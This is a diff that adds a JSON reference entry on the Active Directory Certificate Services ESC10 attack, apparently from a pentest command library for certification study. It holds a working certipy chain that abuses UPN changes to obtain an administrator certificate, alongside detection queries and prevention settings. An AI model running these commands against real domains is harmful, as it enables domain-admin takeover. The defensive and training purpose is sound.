@@ -1,0 +1,94 @@
+{
+  "id": "ad-adcs-esc10-weak-mapping",
+  "name": "ADCS ESC10 - Weak Certificate Mapping",
+  "command": "certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator\ncertipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template User\ncertipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>\ncertipy auth -pfx administrator.pfx -dc-ip <dc_ip>",
+  "description": "ESC10 exploits weak certificate mapping (StrongCertificateBindingEnforcement=0 or CertificateMappingMethods contains UPN mapping). Unlike ESC9, this works with normal templates that DO include the security extension, because the DC is configured to ignore it. Two variants: Case 1 targets user accounts when StrongCertificateBindingEnforcement=0, Case 2 targets machine accounts when CertificateMappingMethods has weak flags.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "SpecterOps Certified Pre-Owned v2; Certipy docs",
+  "tags": [
+    "adcs",
+    "esc10",
+    "certificate-mapping",
+    "strong-binding",
+    "upn-abuse"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CASE 1: StrongCertificateBindingEnforcement = 0 ===\nThe DC does not check the security extension at all.\nSame steps as ESC9 but works with ANY template:\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator\n  certipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template User\n  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== CASE 2: CertificateMappingMethods has UPN bit (0x4) ===\nRegistry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Schannel\\CertificateMappingMethods\nIf bit 0x4 is set, Schannel maps certs by UPN only.\nSame attack flow but targets machine accounts for S4U2Self.\n\n=== CHECK CONFIGURATION ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -stdout | grep -A5 \"StrongCertificateBindingEnforcement\"\n\n=== DIFFERENCE FROM ESC9 ===\nESC9: Template removes the security extension (CT_FLAG_NO_SECURITY_EXTENSION)\nESC10: DC ignores the security extension (registry misconfiguration)",
+  "examples": [
+    {
+      "label": "Check certificate mapping configuration",
+      "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -stdout | grep -i \"strong\""
+    },
+    {
+      "label": "ESC10 Case 1 - exploit weak binding",
+      "command": "certipy account update -u jdoe@corp.local -p Password123 -user victim -upn administrator"
+    },
+    {
+      "label": "Request cert and authenticate",
+      "command": "certipy req -u victim@corp.local -p Password123 -ca corp-CA -template User -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "Certipy 4.0 - ESC9 & ESC10",
+      "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-dumps-and-more-5f7f3ea35f22"
+    },
+    {
+      "title": "MITRE T1649 - Steal or Forge Authentication Certificates",
+      "url": "https://attack.mitre.org/techniques/T1649/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-adcs-esc9-no-security-extension",
+      "note": "ESC9 targets the template flag; ESC10 targets the DC registry.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "When StrongCertificateBindingEnforcement=0, the DC does not verify the security extension SID mapping, allowing certificate impersonation through UPN manipulation.",
+    "prerequisites": "GenericWrite on another account; StrongCertificateBindingEnforcement=0 or weak CertificateMappingMethods.",
+    "impact": "Domain admin compromise via certificate-based impersonation of any user.",
+    "detection": "[MITRE T1649] Same UPN change pattern as ESC9; check registry for weak StrongCertificateBindingEnforcement.",
+    "artifacts": "Event 4738 (UPN change); Event 4886/4887 (cert enrollment); registry audit events.",
+    "splunk_spl": "index=windows EventCode=4738\n| where isnotnull(UserPrincipalName)\n| table _time, SubjectUserName, TargetUserName, UserPrincipalName",
+    "elastic_kql": "event.code:\"4738\" AND winlog.event_data.UserPrincipalName:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4738 and UserPrincipalName != \"\"\n| project TimeGenerated, SubjectUserName, TargetUserName, UserPrincipalName",
+    "sigma_rules": "win_security_adcs_esc10_weak_cert_mapping",
+    "prevention": "Set StrongCertificateBindingEnforcement to 2 (Full Enforcement); ensure CertificateMappingMethods does not include UPN-only mapping (0x4).",
+    "sources": [
+      "SpecterOps research",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "ESC10 - UPN modification for certificate abuse",
+        "logic": "index=windows EventCode=4738\n| where isnotnull(UserPrincipalName)\n| eval suspicious=if(like(UserPrincipalName,\"admin%\") OR like(UserPrincipalName,\"domain admin%\"),1,0)\n| where suspicious=1\n| table _time, SubjectUserName, TargetUserName, UserPrincipalName",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4738"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Account migrations; UPN suffix changes",
+        "tuning": "Alert on any UPN change to known privileged account names"
+      }
+    ]
+  }
+}
